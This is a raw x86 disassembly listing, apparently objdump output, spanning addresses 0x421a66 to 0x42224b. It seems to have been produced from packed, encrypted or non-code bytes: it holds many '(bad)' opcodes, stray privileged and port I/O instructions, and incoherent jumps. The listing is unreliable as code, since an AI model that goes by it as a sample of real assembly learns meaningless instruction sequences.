  421a66:	es mov ah,0x1
  421a69:	out    dx,al
  421a6a:	sti    
  421a6b:	and    BYTE PTR [ebp-0x34dfa8c8],ch
  421a71:	repnz add ecx,edx
  421a74:	ret    0xacdf
  421a77:	test   DWORD PTR [ebx-0x482dfe7d],0x9c1affaa
  421a81:	pop    edi
  421a82:	adc    esp,edi
  421a84:	dec    esi
  421a85:	pop    ds
  421a86:	mov    dl,0x95
  421a88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a89:	fbld   TBYTE PTR [edi+0x31b48691]
  421a8f:	mov    edx,0xc324a961
  421a94:	jmp    0x421a66
  421a96:	les    eax,FWORD PTR [ebp+0x1d]
  421a99:	mov    ecx,0xccfbc46b
  421a9e:	pop    edi
  421a9f:	mov    esp,0xc3d87e71
  421aa4:	jecxz  0x421a57
  421aa6:	cmp    cl,BYTE PTR [eax]
  421aa8:	add    BYTE PTR [ecx],al
  421aaa:	cmp    BYTE PTR [ebx],bh
  421aac:	jmp    0x421ac9
  421aae:	test   DWORD PTR [ebp-0x34],edx
  421ab1:	cwde   
  421ab2:	jo     0x421b31
  421ab4:	mov    al,ds:0xf7e444df
  421ab9:	(bad)  
  421aba:	shl    BYTE PTR [eax-0xd02a395],1
  421ac0:	daa    
  421ac1:	or     BYTE PTR [edi-0x7f],bl
  421ac4:	add    ch,bh
  421ac6:	and    bl,BYTE PTR cs:[edi]
  421ac9:	(bad)  
  421acb:	jmp    0x421b1a
  421acd:	test   BYTE PTR [ebx],0x2a
  421ad0:	or     eax,0x5d0dfd1b
  421ad5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ad6:	ret    0x9fb2
  421ad9:	cli    
  421ada:	lods   al,BYTE PTR ds:[esi]
  421adb:	enter  0x53b3,0x2e
  421adf:	xor    WORD PTR [ebp+0x61eb533a],di
  421ae6:	push   ss
  421ae7:	cmove  eax,DWORD PTR [edi-0x204e188c]
  421aee:	dec    esi
  421aef:	mov    ds,WORD PTR [ebx]
  421af1:	pop    ds
  421af2:	test   eax,0x428ed7d
  421af7:	stos   BYTE PTR es:[edi],al
  421af8:	ss pop edi
  421afa:	jge    0x421abf
  421afc:	mov    esp,ebx
  421afe:	call   0xd9a4:0x2ee81eb0
  421b05:	pop    esp
  421b06:	lods   eax,DWORD PTR ds:[esi]
  421b07:	bound  esi,QWORD PTR [edi-0x5]
  421b0a:	int3   
  421b0b:	jb     0x421b4f
  421b0d:	xor    eax,0x159bacfd
  421b12:	adc    dl,ch
  421b14:	sahf   
  421b15:	cdq    
  421b16:	sbb    dh,0xc
  421b19:	push   eax
  421b1a:	jge    0x421b2c
  421b1c:	adc    DWORD PTR [ebx+ebp*2],0xfffffffa
  421b20:	cmp    DWORD PTR [edx],0x6b2424fd
  421b26:	ins    BYTE PTR es:[edi],dx
  421b27:	lods   eax,DWORD PTR ds:[esi]
  421b28:	or     ecx,ebx
  421b2a:	pop    edx
  421b2b:	fisttp WORD PTR [ebx-0x7c3602af]
  421b31:	xlat   BYTE PTR ds:[ebx]
  421b32:	es xchg ebx,eax
  421b34:	add    al,0x12
  421b36:	std    
  421b37:	out    dx,eax
  421b38:	or     BYTE PTR [ecx-0x5b],ch
  421b3b:	cmp    BYTE PTR [ecx-0x3637af85],0xe2
  421b42:	xor    al,0x5f
  421b44:	and    BYTE PTR ds:0x30ecc3dc,ah
  421b4a:	and    al,BYTE PTR [ecx-0x3f]
  421b4d:	jbe    0x421b6e
  421b4f:	push   edi
  421b50:	fwait
  421b51:	adc    al,0x8d
  421b53:	(bad)  
  421b54:	mov    ds:0xb6eac274,al
  421b59:	iret   
  421b5a:	adc    DWORD PTR [edi],esp
  421b5c:	arpl   WORD PTR [ebp+edi*8-0xf],di
  421b60:	in     al,dx
  421b61:	clc    
  421b62:	mov    ch,0x8
  421b64:	out    dx,al
  421b65:	sahf   
  421b66:	dec    ecx
  421b67:	enter  0xa873,0x19
  421b6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b6c:	sub    dh,BYTE PTR [eax+0x21ecbca9]
  421b72:	mov    ds:0xe0923c4a,al
  421b77:	jmp    0xc83bc2bb
  421b7c:	je     0x421baf
  421b7e:	cmp    ecx,DWORD PTR [edi-0x5ad6709e]
  421b84:	jmp    0x421bb1
  421b86:	pop    ss
  421b87:	dec    BYTE PTR ds:0x3ce11501
  421b8d:	fistp  WORD PTR [ecx+0x4ac72a00]
  421b93:	int    0xc9
  421b95:	pushf  
  421b96:	cld    
  421b97:	xlat   BYTE PTR ds:[ebx]
  421b98:	pop    es
  421b99:	sub    dh,BYTE PTR [eax*8-0x382d698a]
  421ba0:	sub    DWORD PTR [ecx],ebx
  421ba2:	mov    dh,0x2a
  421ba4:	adc    BYTE PTR [edx+0x5eeb87cd],dh
  421baa:	int    0xe7
  421bac:	leave  
  421bad:	push   eax
  421baf:	imul   ebp,esp,0xa85ab9df
  421bb5:	dec    esi
  421bb6:	mov    bh,0xcf
  421bb8:	mov    cl,0x84
  421bba:	std    
  421bbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421bbc:	xchg   ebp,eax
  421bbd:	neg    DWORD PTR [ebx]
  421bbf:	in     eax,0x64
  421bc1:	pushf  
  421bc2:	inc    edi
  421bc3:	fbld   TBYTE PTR [edi-0x2d]
  421bc6:	cld    
  421bc7:	mov    al,0xff
  421bc9:	mov    edi,0x958c9364
  421bcf:	jp     0x421bb4
  421bd1:	xchg   ebp,eax
  421bd2:	or     eax,0x879eb96
  421bd7:	ficomp WORD PTR [eax+esi*1+0x6a]
  421bdb:	and    eax,DWORD PTR [ebp+0x39]
  421bde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bdf:	enter  0x1ed0,0x3b
  421be3:	cwde   
  421be4:	into   
  421be5:	addr16 mov eax,ds:0xeb06
  421be9:	jl     0x421bbc
  421beb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421bec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bed:	je     0x421bd5
  421bef:	scas   al,BYTE PTR es:[edi]
  421bf0:	push   0xe2dfdc39
  421bf5:	dec    eax
  421bf6:	std    
  421bf7:	int    0x90
  421bf9:	js     0x421c77
  421bfb:	in     eax,0xcb
  421bfd:	in     eax,0xfc
  421bff:	in     eax,0xb1
  421c01:	push   ds
  421c02:	mov    ecx,0x2039e9d2
  421c07:	enter  0xe6e,0x28
  421c0b:	lahf   
  421c0c:	mov    al,0x14
  421c0e:	das    
  421c0f:	adc    bl,ch
  421c11:	add    cl,dh
  421c13:	cld    
  421c14:	inc    ecx
  421c15:	sbb    eax,0x69865b4
  421c1a:	leave  
  421c1b:	arpl   WORD PTR [ebx-0x67],bp
  421c1e:	adc    eax,0xa44b9355
  421c23:	jmp    0xdf16:0x8d57bded
  421c2a:	sub    eax,DWORD PTR [ecx+0x29eee706]
  421c30:	or     eax,0xdc6f14df
  421c35:	mov    eax,ds:0xfd6e2901
  421c3b:	(bad)  
  421c3c:	sub    bh,cl
  421c3e:	loope  0x421c4b
  421c40:	add    DWORD PTR [esi],ecx
  421c42:	dec    ecx
  421c43:	enter  0xd415,0x98
  421c47:	mov    ah,0x41
  421c49:	cmp    ecx,DWORD PTR [ebx+0x5a]
  421c4c:	jmp    0xaf49:0x830767e6
  421c53:	daa    
  421c54:	jnp    0x421c1f
  421c56:	cdq    
  421c57:	sbb    DWORD PTR [ecx-0x41376eaf],edi
  421c5d:	cmp    al,0x2f
  421c5f:	or     BYTE PTR [ecx-0x149c13ac],al
  421c65:	xchg   ebx,eax
  421c66:	sub    BYTE PTR [ebx+0x244f8300],bh
  421c6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c6d:	or     bl,BYTE PTR [esi]
  421c6f:	popa   
  421c70:	ja     0x421ca1
  421c72:	cmp    eax,0xd452eb43
  421c77:	lods   eax,DWORD PTR ds:[esi]
  421c78:	add    DWORD PTR [esi+0x6d],esp
  421c7b:	push   ebp
  421c7c:	fidiv  WORD PTR [esi-0x6ed7380c]
  421c82:	aad    0xa5
  421c84:	or     BYTE PTR [edx-0x36823894],0x51
  421c8b:	daa    
  421c8c:	int    0x1c
  421c8e:	xor    DWORD PTR [edx],ebp
  421c90:	cmp    al,0x3f
  421c92:	hlt    
  421c93:	sub    al,0x8b
  421c95:	inc    ebx
  421c96:	xchg   esi,esp
  421c98:	jmp    0x421cf9
  421c9a:	mov    dl,0xe1
  421c9c:	dec    ecx
  421c9d:	pop    ebp
  421c9e:	dec    edi
  421c9f:	jge    0x421c62
  421ca1:	fbld   TBYTE PTR [edx-0x30]
  421ca4:	pushw  0x2b4a
  421ca8:	sub    BYTE PTR [eax-0x9f8f705],bl
  421cae:	dec    edi
  421caf:	(bad)  [ebx]
  421cb1:	(bad)  
  421cb3:	daa    
  421cb4:	fcomp  QWORD PTR [bx+di+0x71]
  421cb8:	(bad)  
  421cba:	adc    BYTE PTR [ebx+0x43],0xe6
  421cbe:	sub    eax,0x3c77c7be
  421cc3:	pushf  
  421cc4:	jmp    0x421cde
  421cc6:	adc    ecx,DWORD PTR [ebx-0x4b]
  421cc9:	call   0xd345:0x7f41cb6b
  421cd0:	sub    eax,0x70a2add9
  421cd5:	sbb    eax,DWORD PTR [edx-0x21]
  421cd8:	jmp    0x421cfc
  421cda:	iret   
  421cdb:	cmp    al,0x22
  421cdd:	retf   
  421cde:	clc    
  421cdf:	cmp    al,0x47
  421ce1:	fild   WORD PTR [ebp-0x67]
  421ce4:	sbb    eax,0xcb426716
  421ce9:	jl     0x421ce8
  421ceb:	ror    ah,cl
  421ced:	mov    edi,0x7b924341
  421cf2:	cli    
  421cf3:	(bad)  
  421cf4:	sahf   
  421cf5:	scas   al,BYTE PTR es:[edi]
  421cf6:	sbb    al,dl
  421cf8:	ins    BYTE PTR es:[edi],dx
  421cf9:	push   ecx
  421cfa:	or     DWORD PTR [edx],ebp
  421cfc:	sahf   
  421cfd:	jecxz  0x421cfa
  421cff:	and    DWORD PTR [ebp+0x4b10add1],ecx
  421d05:	test   al,0x3a
  421d07:	jecxz  0x421d47
  421d09:	fist   WORD PTR [esp]
  421d0c:	outs   dx,DWORD PTR ds:[esi]
  421d0d:	loope  0x421d54
  421d0f:	stos   DWORD PTR es:[edi],eax
  421d10:	or     BYTE PTR [edx-0xa6ec204],bl
  421d16:	dec    ebp
  421d17:	out    0x6d,eax
  421d19:	or     bl,BYTE PTR [esi+0x2a]
  421d1c:	mov    dl,0xd9
  421d1e:	or     al,0x70
  421d20:	clc    
  421d21:	retf   
  421d22:	fdiv   st(6),st
  421d24:	push   esp
  421d25:	or     eax,0x4eed4c0b
  421d2a:	xchg   ebp,eax
  421d2b:	or     dl,0xff
  421d2e:	push   edi
  421d2f:	mul    edx
  421d31:	sbb    al,0xf
  421d33:	mov    esp,0xc8465fcf
  421d38:	xor    BYTE PTR [eax+0x56],dh
  421d3b:	lods   eax,DWORD PTR ds:[esi]
  421d3c:	mov    ah,0xf8
  421d3e:	jmp    DWORD PTR [esi+ecx*1-0x7006c854]
  421d45:	push   ds
  421d46:	es jg  0x421d14
  421d49:	ja     0x421cda
  421d4b:	enter  0x39f5,0xa3
  421d4f:	mov    esp,0x5d8418e7
  421d54:	jmp    0x421d10
  421d56:	retf   
  421d57:	adc    ebp,DWORD PTR [edi-0x71]
  421d5a:	xor    DWORD PTR [ecx+0x70],0xffffffdf
  421d5e:	sbb    DWORD PTR [ebp+0x590e2b77],edx
  421d64:	mov    esp,0x8be0fc80
  421d69:	sub    al,dl
  421d6b:	mov    ebp,0xaa9a90ac
  421d70:	pop    es
  421d71:	xchg   esp,esi
  421d73:	cwde   
  421d74:	jl     0x421d55
  421d76:	call   0xc0872086
  421d7b:	cmp    eax,0x6ffc9dff
  421d80:	cli    
  421d81:	add    BYTE PTR [edi],ah
  421d83:	ret    
  421d84:	stos   BYTE PTR es:[edi],al
  421d85:	scas   eax,DWORD PTR es:[edi]
  421d86:	sbb    al,0xc7
  421d88:	xchg   edx,eax
  421d89:	dec    esp
  421d8a:	cmp    al,0x38
  421d8c:	cdq    
  421d8d:	aas    
  421d8e:	and    BYTE PTR [ecx+ecx*1+0x6ceffcd2],bh
  421d95:	xchg   edi,eax
  421d96:	ins    DWORD PTR es:[edi],dx
  421d97:	(bad)  
  421d98:	ss leave 
  421d9a:	add    DWORD PTR [ebp-0x77d218ba],edi
  421da0:	sub    eax,0x7b84ddf8
  421da5:	data16 std 
  421da7:	inc    esi
  421da8:	fisttp DWORD PTR ds:0x284c011b
  421dae:	leave  
  421daf:	enter  0x1b5d,0xf5
  421db3:	and    dh,BYTE PTR [esi-0x14cc2b0b]
  421db9:	mov    ah,bl
  421dbb:	clc    
  421dbc:	out    dx,eax
  421dbd:	adc    ebx,ebx
  421dbf:	les    eax,FWORD PTR [ebx-0x7fa94b20]
  421dc5:	scas   eax,DWORD PTR es:[edi]
  421dc6:	stos   DWORD PTR es:[edi],eax
  421dc7:	or     cl,dl
  421dc9:	arpl   WORD PTR [ebx],si
  421dcb:	jno    0x421db8
  421dcd:	out    dx,eax
  421dce:	int3   
  421dcf:	and    BYTE PTR [esi],cl
  421dd1:	mov    ah,0x67
  421dd3:	add    eax,0x87f0de6c
  421dd8:	xor    bh,cl
  421dda:	rcl    DWORD PTR [ebx+0x27be4b71],1
  421de0:	jmp    0x75da:0xd81dae83
  421de7:	add    ah,dl
  421de9:	pop    edx
  421dea:	jmp    0x67735db9
  421def:	and    dh,bl
  421df1:	mov    BYTE PTR [ebp+0x53],dl
  421df4:	sbb    eax,0xebe22ca5
  421df9:	cmp    DWORD PTR [edx-0x5f875df1],0xe7cbf5a8
  421e03:	(bad)  
  421e04:	sbb    DWORD PTR [ecx+0x79],eax
  421e07:	aaa    
  421e08:	popf   
  421e09:	push   ds
  421e0a:	xchg   BYTE PTR [edi-0x15],dh
  421e0d:	ja     0x421de6
  421e0f:	popa   
  421e10:	cld    
  421e11:	xor    BYTE PTR [ecx+0x67df892f],al
  421e17:	loopne 0x421df7
  421e19:	sbb    BYTE PTR [ebp-0x26fe305],0x58
  421e20:	test   BYTE PTR [ecx+0x27],0xd
  421e24:	(bad)  
  421e25:	sar    DWORD PTR [ebp-0x191e5d38],cl
  421e2b:	sub    ebp,DWORD PTR [edi-0x77]
  421e2e:	mov    si,0x32e6
  421e32:	ror    DWORD PTR [edx-0x31a3392f],cl
  421e38:	add    edi,ecx
  421e3a:	jl     0x421e04
  421e3c:	inc    ecx
  421e3d:	sar    edx,1
  421e3f:	mov    ds,WORD PTR [eax-0x6d]
  421e42:	lods   eax,DWORD PTR ds:[esi]
  421e43:	popa   
  421e44:	jmp    0x421e03
  421e46:	daa    
  421e47:	xchg   DWORD PTR [eax+0x75b64eba],eax
  421e4d:	(bad)  
  421e4f:	inc    ecx
  421e50:	pop    edi
  421e51:	cmp    esp,ebx
  421e53:	dec    esp
  421e54:	icebp  
  421e55:	jae    0x421e54
  421e57:	outs   dx,DWORD PTR ds:[esi]
  421e58:	jnp    0x421e2a
  421e5a:	add    DWORD PTR [ebx+0x6],eax
  421e5d:	bound  ecx,QWORD PTR [edi+0x77381bc5]
  421e63:	mov    bh,0x46
  421e65:	pop    ds
  421e66:	add    cl,dh
  421e68:	mov    al,ds:0x4a36008a
  421e6d:	into   
  421e6e:	push   es
  421e6f:	mov    ah,0xa9
  421e71:	daa    
  421e72:	dec    ebx
  421e73:	pop    esp
  421e74:	das    
  421e75:	(bad)  
  421e76:	call   0x9385:0xfbf9c4c8
  421e7d:	mov    ebp,0xb300bb9d
  421e82:	xor    esi,DWORD PTR [edx]
  421e84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e85:	pop    edi
  421e86:	cmc    
  421e87:	or     ch,BYTE PTR ds:0xd5ebd4a8
  421e8d:	fnstsw ax
  421e8f:	retf   0xd8d8
  421e92:	push   ecx
  421e93:	mov    bh,0x8b
  421e95:	jg     0x421e9d
  421e97:	shld   DWORD PTR [si],ecx,cl
  421e9b:	jle    0x421eb0
  421e9d:	and    BYTE PTR [edx+0x4b0614c8],dh
  421ea3:	add    ch,BYTE PTR [edi-0x20baac96]
  421ea9:	enter  0xc80e,0xdd
  421ead:	pop    ss
  421eae:	daa    
  421eaf:	gs pop ss
  421eb1:	xor    dl,BYTE PTR [edi+eax*8]
  421eb4:	and    DWORD PTR [ebx+eax*1-0x19],esi
  421eb8:	(bad)  
  421eba:	pop    es
  421ebb:	and    ebp,DWORD PTR [eax+0x167efcd5]
  421ec1:	frstor [ecx-0x4e]
  421ec4:	int    0x27
  421ec6:	jbe    0x421e87
  421ec8:	daa    
  421ec9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421eca:	outs   dx,DWORD PTR ds:[esi]
  421ecb:	enter  0xb7fa,0x65
  421ecf:	jl     0x421efa
  421ed1:	fwait
  421ed2:	in     al,dx
  421ed3:	mov    ebx,0x668ac70e
  421ed8:	cmp    al,0x45
  421eda:	enter  0x5422,0xdf
  421ede:	push   edx
  421edf:	adc    eax,0xc3f48ea3
  421ee4:	or     eax,0x976bfcf5
  421ee9:	sub    BYTE PTR [ecx],dl
  421eeb:	sbb    BYTE PTR [ebx-0x1271a636],ch
  421ef1:	cmp    eax,DWORD PTR [ebp-0x3edc5c38]
  421ef7:	push   edi
  421ef8:	ficomp WORD PTR [esi+0x4b]
  421efb:	(bad)  
  421efc:	mov    ebp,?
  421efe:	rcl    BYTE PTR [eax-0x27a7a0e5],cl
  421f04:	or     esi,0xdb2a7f2
  421f0a:	or     ch,BYTE PTR [eax]
  421f0c:	xchg   edx,eax
  421f0d:	sub    al,0x69
  421f0f:	or     dl,BYTE PTR [eax-0x197116f8]
  421f15:	mov    ds:0x9fda7a32,al
  421f1a:	jnp    0x421eae
  421f1c:	mov    ch,0x6f
  421f1e:	lods   eax,DWORD PTR ds:[esi]
  421f1f:	(bad)  
  421f21:	mov    al,ds:0xbe134302
  421f26:	mov    WORD PTR [edx],ss
  421f28:	mov    BYTE PTR [esi+edi*1+0x77ac28c8],bh
  421f2f:	stc    
  421f30:	mov    edx,esi
  421f32:	xor    BYTE PTR ds:0xf3fd8a0d,ch
  421f38:	pop    ecx
  421f39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f3a:	push   esp
  421f3b:	lods   al,BYTE PTR ds:[esi]
  421f3c:	jo     0x421ee0
  421f3e:	sub    al,0xcb
  421f40:	(bad)  
  421f41:	and    BYTE PTR [ecx],bl
  421f43:	mov    cs,WORD PTR ds:0xe53b9ce3
  421f49:	cmp    ch,bh
  421f4b:	aad    0x5f
  421f4d:	in     al,0x13
  421f4f:	inc    ebx
  421f50:	lea    edx,[edx]
  421f52:	pop    ds
  421f53:	cwde   
  421f54:	mov    ch,0xd8
  421f56:	pop    ss
  421f57:	pop    ebx
  421f58:	or     al,0xb5
  421f5a:	jl     0x421f70
  421f5c:	jle    0x421f64
  421f5e:	cmp    edi,esi
  421f60:	in     eax,dx
  421f61:	sbb    al,0xe9
  421f64:	mov    ?,WORD PTR [edi+0x6d]
  421f67:	cmp    DWORD PTR [eax+0x20be6feb],edi
  421f6d:	lods   al,BYTE PTR ds:[esi]
  421f6e:	sub    ebp,DWORD PTR [ebx+ebx*1-0x20]
  421f72:	(bad)  
  421f74:	push   ecx
  421f75:	aas    
  421f76:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f78:	cmc    
  421f79:	mov    ds:0x3acd98fc,eax
  421f7e:	add    ah,BYTE PTR [eax-0x37fea3c7]
  421f84:	loope  0x421f62
  421f86:	push   esp
  421f87:	xor    ch,BYTE PTR [eax-0x135412fe]
  421f8d:	mov    gs,WORD PTR [esi]
  421f8f:	add    ch,al
  421f91:	xchg   ecx,eax
  421f92:	sub    BYTE PTR [ebx],ch
  421f94:	daa    
  421f95:	adc    BYTE PTR [eax+ecx*8-0x1cf9215f],0xf2
  421f9d:	xchg   ebp,eax
  421f9e:	loopne 0x422013
  421fa0:	pop    ss
  421fa1:	or     eax,0xb2392401
  421fa6:	jl     0x421f9c
  421fa8:	jb     0x421f3a
  421faa:	pop    esi
  421fab:	xchg   BYTE PTR [edx-0x142e99f5],dh
  421fb1:	aas    
  421fb2:	retf   
  421fb3:	jbe    0x421ffa
  421fb5:	loop   0x421ff4
  421fb7:	inc    eax
  421fb8:	and    ecx,edx
  421fba:	std    
  421fbb:	stc    
  421fbc:	xor    esp,DWORD PTR [ebp-0x39]
  421fbf:	add    al,0x13
  421fc1:	or     al,0xa5
  421fc3:	in     eax,dx
  421fc4:	rcr    edi,cl
  421fc6:	push   esp
  421fc7:	ss std 
  421fc9:	sub    ch,bl
  421fcb:	aam    0xc5
  421fcd:	mov    ch,0xfc
  421fcf:	adc    al,0xf9
  421fd1:	(bad)  
  421fd2:	sti    
  421fd3:	fcomp  QWORD PTR [edx]
  421fd5:	retf   0xc8c7
  421fd8:	cwde   
  421fd9:	fst    DWORD PTR [ecx*8-0x134097df]
  421fe0:	fisubr WORD PTR [edi-0x76]
  421fe3:	dec    eax
  421fe4:	xchg   ecx,eax
  421fe5:	add    esi,DWORD PTR [ebp+0x374b9b2a]
  421feb:	enter  0x154,0x57
  421fef:	push   es
  421ff0:	jbe    0x422058
  421ff2:	fbstp  TBYTE PTR [edx-0x12]
  421ff5:	out    dx,al
  421ff6:	mov    ebp,0x9d9fd5bc
  421ffb:	lock jge 0x421f8e
  421ffe:	xor    bl,ch
  422000:	repz adc dh,bl
  422003:	into   
  422004:	mov    esi,0x35cd9d1d
  422009:	xchg   edi,eax
  42200a:	and    eax,ebx
  42200c:	hlt    
  42200d:	loopne 0x422066
  42200f:	adc    eax,0x6184dfe8
  422014:	dec    ebp
  422015:	aam    0x10
  422017:	fwait
  422018:	imul   ebp,ebp,0xdf35d027
  42201e:	aam    0xaa
  422020:	xchg   esi,eax
  422021:	inc    ecx
  422022:	scas   eax,DWORD PTR es:[edi]
  422023:	dec    ebp
  422024:	jmp    0x42204b
  422026:	jbe    0x42208b
  422028:	outs   dx,BYTE PTR ds:[esi]
  422029:	inc    ebp
  42202a:	mov    ecx,0x62dd7739
  42202f:	mov    al,ds:0x8afe6504
  422034:	data16 and BYTE PTR [edi],bh
  422037:	mov    eax,0x913949be
  42203c:	ret    
  42203d:	adc    edx,DWORD PTR [eax+ecx*8+0x29411c52]
  422044:	and    ebp,ecx
  422046:	loop   0x422005
  422048:	in     al,0x27
  42204a:	cmp    cl,BYTE PTR [edi+0x38]
  42204d:	dec    ebp
  42204e:	cmp    eax,0xdf4bdac0
  422053:	je     0x422040
  422055:	outs   dx,BYTE PTR ds:[esi]
  422056:	shl    BYTE PTR [esi-0x6b],cl
  422059:	jnp    0x422042
  42205b:	fild   DWORD PTR [edi-0x18ffd617]
  422061:	lahf   
  422062:	pop    ss
  422063:	fist   DWORD PTR [edi-0x13bba165]
  422069:	iret   
  42206a:	sbb    eax,0xe4b0769a
  42206f:	sub    BYTE PTR [edi],bh
  422071:	mov    al,ds:0x3ab5e6cd
  422076:	es enter 0x867c,0x34
  42207b:	retf   
  42207c:	test   al,0x67
  42207e:	cld    
  42207f:	cli    
  422080:	into   
  422081:	adc    bh,dl
  422083:	mov    eax,ds:0x9988a41b
  422088:	pop    eax
  422089:	fscale 
  42208b:	push   ds
  42208c:	vmread DWORD PTR [ebp-0x71084bed],ebx
  422093:	or     ch,bl
  422095:	xchg   BYTE PTR [eax-0x28],dl
  422098:	mov    dh,0xba
  42209a:	sti    
  42209b:	ins    BYTE PTR es:[edi],dx
  42209c:	xor    BYTE PTR ds:0xcebccc3,al
  4220a2:	fld    QWORD PTR gs:0xeb5fa904
  4220a9:	lahf   
  4220aa:	rcl    bh,0xf
  4220ad:	data16 stos BYTE PTR es:[edi],al
  4220af:	mov    bh,0x86
  4220b1:	leave  
  4220b2:	mov    al,ds:0xf24eb2c8
  4220b7:	int    0xf1
  4220b9:	mov    eax,0x46ed433d
  4220be:	inc    esp
  4220bf:	stos   DWORD PTR es:[edi],eax
  4220c0:	mov    ebx,0x882508df
  4220c5:	xor    eax,0xde279037
  4220ca:	cld    
  4220cb:	cmp    DWORD PTR [edx-0x2f],esi
  4220ce:	mov    al,0x70
  4220d0:	xor    eax,0x1497fc99
  4220d5:	push   edx
  4220d6:	jnp    0x422145
  4220d8:	jae    0x422072
  4220da:	test   edi,0x29144126
  4220e0:	cmc    
  4220e1:	mov    eax,ds:0x33cfb7d1
  4220e6:	mov    ds:0xc206eb3c,eax
  4220eb:	test   DWORD PTR [bx],ebx
  4220ee:	add    ecx,ecx
  4220f0:	pop    ecx
  4220f1:	push   edi
  4220f2:	and    al,0xb7
  4220f4:	mov    ds:0x2f147818,eax
  4220f9:	or     al,0xfe
  4220fb:	out    dx,al
  4220fc:	fiadd  WORD PTR [esi-0x34]
  4220ff:	push   esp
  422100:	pop    es
  422101:	mov    ds,ebp
  422103:	xor    eax,0x5823d8b7
  422108:	jp     0x4220ba
  42210a:	mov    esp,0x29296d67
  42210f:	mov    bh,0xeb
  422111:	jg     0x4220fd
  422113:	or     eax,0x21c21d27
  422118:	rcr    edi,1
  42211a:	mov    ebx,0xa4535c3d
  42211f:	mov    eax,ds:0x4321a581
  422124:	jmp    0x42216b
  422126:	pop    es
  422127:	add    al,0xd7
  422129:	sub    BYTE PTR [ebx+0x57dce076],al
  42212f:	cmp    cl,BYTE PTR [esi+0x1306a580]
  422135:	popa   
  422136:	add    al,BYTE PTR ds:0xde84c2eb
  42213c:	push   ecx
  42213d:	cmp    eax,0xdf08699d
  422142:	push   eax
  422143:	cli    
  422144:	mov    dl,0x36
  422146:	es pop esp
  422148:	aam    0xb3
  42214a:	cld    
  42214b:	fiadd  DWORD PTR [ebp-0x2972e679]
  422151:	fisttp DWORD PTR [ecx]
  422153:	into   
  422154:	inc    edi
  422155:	lahf   
  422156:	or     eax,0x69e5cb8f
  42215b:	or     DWORD PTR [ecx+0x24c0fd1c],edi
  422161:	pop    eax
  422162:	sub    al,0x68
  422164:	pop    esp
  422165:	sub    al,0x73
  422167:	enter  0x681,0x9b
  42216b:	ror    BYTE PTR [ebx+edx*1],cl
  42216e:	mov    ds:0xfce59d5d,al
  422173:	pusha  
  422174:	popf   
  422175:	push   eax
  422176:	enter  0x578f,0xb
  42217a:	mov    bh,0xc8
  42217c:	jmp    0x7e42d58d
  422181:	outs   dx,DWORD PTR ds:[esi]
  422182:	pusha  
  422183:	cwde   
  422184:	adc    eax,ebp
  422186:	xor    ah,dh
  422188:	pop    DWORD PTR [edi]
  42218a:	pop    edx
  42218b:	loopne 0x42213c
  42218d:	pop    esp
  42218e:	or     esp,DWORD PTR [edx+edi*2-0x49]
  422192:	add    BYTE PTR [eax],0x99
  422195:	(bad)  
  422197:	retf   0x856a
  42219a:	pop    ds
  42219b:	out    dx,eax
  42219c:	ret    
  42219d:	pop    eax
  42219e:	sahf   
  42219f:	mov    esi,0x2e553ac
  4221a4:	jmp    0x422196
  4221a6:	mov    cl,0x59
  4221a8:	mov    bh,0xdc
  4221aa:	out    0xd9,al
  4221ac:	arpl   di,bx
  4221ae:	nop
  4221af:	jge    0x422190
  4221b1:	jmp    0xc2f7:0xe11312e5
  4221b8:	sbb    BYTE PTR [ecx+0x69],al
  4221bb:	dec    eax
  4221bc:	mov    ebx,eax
  4221be:	pop    ebx
  4221bf:	retf   
  4221c0:	ins    BYTE PTR es:[edi],dx
  4221c1:	fistp  WORD PTR [ebx+0x7b99fcb7]
  4221c7:	(bad)  
  4221c8:	mov    ds:0x4338fd6b,eax
  4221cd:	adc    al,0xb3
  4221cf:	xchg   ecx,eax
  4221d0:	cdq    
  4221d1:	inc    esi
  4221d2:	sbb    al,cl
  4221d4:	div    DWORD PTR [edi-0x2284641e]
  4221da:	mov    ebp,0x67c3fd94
  4221df:	out    dx,eax
  4221e0:	sub    esi,DWORD PTR [ebx]
  4221e2:	adc    bl,dh
  4221e4:	addr16 adc al,0x26
  4221e7:	enter  0x9ca9,0x77
  4221eb:	cmp    ch,cl
  4221ed:	jle    0x42226b
  4221ef:	cmp    ebp,ebx
  4221f1:	je     0x4221d7
  4221f3:	jp     0x4221c1
  4221f5:	push   es
  4221f6:	push   ebx
  4221f7:	jns    0x42223e
  4221f9:	addr16 jb 0x4221c4
  4221fc:	push   esi
  4221fd:	dec    esp
  4221fe:	cmc    
  4221ff:	mov    al,0xab
  422201:	and    BYTE PTR [ebp+0x38],cl
  422204:	cmc    
  422205:	xchg   ebp,eax
  422206:	jmp    0x4221f2
  422208:	jmp    0x42220a
  42220a:	pop    ss
  42220b:	faddp  st(5),st
  42220d:	and    al,0x3a
  42220f:	enter  0x3f0,0x3f
  422213:	repz dec esp
  422215:	ins    DWORD PTR es:[edi],dx
  422216:	icebp  
  422217:	dec    ebp
  422218:	jmp    0x422240
  42221a:	ret    0xafb9
  42221d:	sti    
  42221e:	shl    DWORD PTR [edi-0x49],1
  422221:	fadd   DWORD PTR [eax+edi*1]
  422224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422226:	xor    dl,BYTE PTR [edi+0x2b]
  422229:	pop    edi
  42222a:	mov    ds:0x21e046e8,eax
  42222f:	inc    edi
  422230:	jmp    0x422265
  422232:	das    
  422233:	pop    edx
  422234:	sahf   
  422235:	sbb    BYTE PTR [esi-0x711f6f11],bh
  42223b:	fsubp  st(5),st
  42223d:	sbb    al,0xe4
  42223f:	div    DWORD PTR [ecx]
  422241:	rcr    bh,0x81
  422244:	jmp    0x422230
  422246:	pop    edx
  422247:	cli    
  422248:	ins    BYTE PTR es:[edi],dx
  422249:	cs dec edi
  42224b:	in     eax,0xea
